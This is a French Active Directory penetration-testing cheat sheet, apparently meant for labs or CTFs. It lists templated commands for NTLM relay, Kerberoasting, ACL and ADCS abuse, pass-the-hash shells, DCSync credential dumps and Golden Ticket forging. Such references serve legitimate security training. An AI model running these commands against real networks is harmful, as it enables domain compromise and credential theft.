# Cheatsheet — Outils par usage et phase

---

## Tableau de référence complet

| Outil | Usage | Phase | Commande de base |
|-------|-------|-------|-----------------|
| **nmap** | Scan réseau, découverte DC | Reconnaissance | `nmap -p 88 --open $RANGE` |
| **responder** | Capture hashes NTLMv2 | Accès initial | `sudo responder -I $IFACE -rdw` |
| **mitm6** | DHCPv6 MiTM, redirection auth | Accès initial | `sudo mitm6 -d $DOMAIN -i $IFACE` |
| **ntlmrelayx** | Relay NTLM vers SMB/LDAP | Accès initial | `ntlmrelayx.py -tf targets.txt -smb2support` |
| **kerbrute** | Énumération users, spray Kerberos | Accès initial | `kerbrute userenum -d $DOMAIN --dc $DC_IP users.txt` |
| **hashcat** | Crack de hashes offline | Accès initial / Escalade | `hashcat -m 5600 hash.txt rockyou.txt` |
| **john** | Crack de hashes (alternative) | Accès initial / Escalade | `john --format=netntlmv2 hash.txt --wordlist=rockyou.txt` |
| **bloodhound-python** | Collecte BloodHound | Énumération | `bloodhound-python -u $USER -p $PWD -d $DOMAIN -c All` |
| **BloodHound** | Graphe chemins vers DA | Énumération | GUI — importer le .zip |
| **nxc / netexec** | Couteau suisse SMB/LDAP/WinRM | Toutes phases | `nxc smb $RANGE -u $USER -p $PWD -d $DOMAIN` |
| **ldapdomaindump** | Dump LDAP complet | Énumération | `ldapdomaindump -u "$DOMAIN\\$USER" -p $PWD $DC_IP` |
| **enum4linux-ng** | Énumération complète | Énumération | `enum4linux-ng -a $DC_IP` |
| **smbclient** | Accès partages SMB | Énumération | `smbclient //$DC_IP/SYSVOL -U $DOMAIN/$USER%$PWD` |
| **GetUserSPNs** | Kerberoasting | Escalade | `GetUserSPNs.py $DOMAIN/$USER:$PWD -dc-ip $DC_IP -request` |
| **GetNPUsers** | AS-REP Roasting | Escalade | `GetNPUsers.py $DOMAIN/ -no-pass -usersfile users.txt -dc-ip $DC_IP` |
| **bloodyAD** | Abus ACL (GenericAll/WriteDACL) | Escalade | `bloodyAD -u $USER -p $PWD -d $DOMAIN --dc-ip $DC_IP set password $TARGET 'Pass!'` |
| **targetedKerberoast** | Kerberoasting ciblé via GenericWrite | Escalade | `targetedKerberoast.py -d $DOMAIN -u $USER -p $PWD` |
| **certipy** | ADCS — audit et exploitation | Escalade | `certipy find -u $USER@$DOMAIN -p $PWD -dc-ip $DC_IP -vulnerable` |
| **addcomputer.py** | Créer compte machine (RBCD) | Escalade | `addcomputer.py -computer-name 'EVIL$' -computer-pass 'Pass!' ...` |
| **rbcd.py** | Configurer RBCD | Escalade | `rbcd.py -delegate-from 'EVIL$' -delegate-to 'TARGET$' ...` |
| **getST.py** | S4U2proxy (délégation) | Escalade | `getST.py -spn 'cifs/target' -impersonate Administrator ...` |
| **psexec.py** | Shell SYSTEM via SMB | Mouvement latéral | `psexec.py -hashes :$HASH $DOMAIN/$USER@$TARGET` |
| **wmiexec.py** | Shell via WMI (discret) | Mouvement latéral | `wmiexec.py -hashes :$HASH $DOMAIN/$USER@$TARGET` |
| **smbexec.py** | Shell via SMB | Mouvement latéral | `smbexec.py -hashes :$HASH $DOMAIN/$USER@$TARGET` |
| **evil-winrm** | Shell WinRM interactif | Mouvement latéral | `evil-winrm -i $TARGET -u $USER -H $HASH` |
| **getTGT.py** | Obtenir un TGT Kerberos | Mouvement latéral | `getTGT.py $DOMAIN/$USER:$PWD` |
| **secretsdump.py** | DCSync, dump SAM/LSA | Compromission | `secretsdump.py $DOMAIN/$USER:$PWD@$DC_IP -just-dc-ntlm` |
| **ticketer.py** | Golden/Silver/Diamond Ticket | Compromission | `ticketer.py -nthash $KRBTGT -domain-sid $SID -domain $DOMAIN Administrator` |
| **lookupsid.py** | Récupérer SID du domaine | Compromission | `lookupsid.py $DOMAIN/$USER:$PWD@$DC_IP 0` |
| **findDelegation.py** | Trouver les délégations | Énumération | `findDelegation.py $DOMAIN/$USER:$PWD -dc-ip $DC_IP` |
| **gpp-decrypt** | Déchiffrer cpassword GPP | Loot | `gpp-decrypt 'CPASSWORD'` |
| **ticketConverter.py** | ccache ↔ kirbi | Kerberos | `ticketConverter.py ticket.ccache ticket.kirbi` |
| **proxychains** | Tunneliser via SOCKS | Relay | `proxychains -q psexec.py ...` |

---

## Par phase d'attaque

### Phase 0 — Setup
- `ip a`, `ip route` — réseau
- `/etc/hosts`, `/etc/resolv.conf` — DNS

### Phase 1 — Reconnaissance
- `nmap` → scanner le réseau
- `nxc smb $RANGE` → découverte hôtes
- `responder -A` → écoute passive
- `dig axfr` → zone DNS

### Phase 2 — Accès Initial
- `responder` → capture NTLMv2
- `ntlmrelayx` → relay NTLM
- `mitm6` → DHCPv6 MiTM
- `kerbrute` → spray et énumération users
- `GetNPUsers.py` → AS-REP sans auth
- `hashcat -m 5600` → cracker NTLMv2
- `hashcat -m 18200` → cracker AS-REP

### Phase 3 — Énumération
- `bloodhound-python` → collecte BloodHound
- `nxc smb` → shares, users, groups
- `ldapdomaindump` → dump LDAP
- `smbclient /SYSVOL` → chercher flags / GPP
- `gpp-decrypt` → décrypter cpassword
- `certipy find` → ADCS vulnérable

### Phase 4 — Escalade
- `GetUserSPNs.py` + `hashcat -m 13100` → Kerberoasting
- `GetNPUsers.py` + `hashcat -m 18200` → AS-REP Roasting
- `bloodyAD` → abus ACL
- `certipy req/auth` → ADCS ESC1
- `addcomputer + rbcd + getST` → RBCD

### Phase 5 — Mouvement latéral
- `nxc smb -H $HASH` → PtH spray
- `psexec.py / wmiexec.py / evil-winrm` → shell
- `nxc --sam --lsa --ntds` → dump credentials
- `secretsdump.py` → dump complet
- `getTGT.py` → PtT

### Phase 6 — Compromission
- `secretsdump.py -just-dc-ntlm` → DCSync
- `ticketer.py` → Golden Ticket
- `psexec.py -k -no-pass` → utiliser ticket

---

## Rappel — Formats d'authentification Impacket/nxc

```bash
# Mot de passe en clair
-u alice -p 'Password123!'
'DOMAIN/alice:Password123!'

# Hash LM:NT
-H 'aad3b435b51404eeaad3b435b51404ee:AABBCCDDEEFF0011'
-hashes 'aad3b435b51404eeaad3b435b51404ee:AABBCCDDEEFF0011'

# Hash NT uniquement (les deux-points AVANT)
-H ':AABBCCDDEEFF0011'
-hashes ':AABBCCDDEEFF0011'

# Kerberos (ticket chargé dans KRB5CCNAME)
-k -no-pass
--use-kcache
```
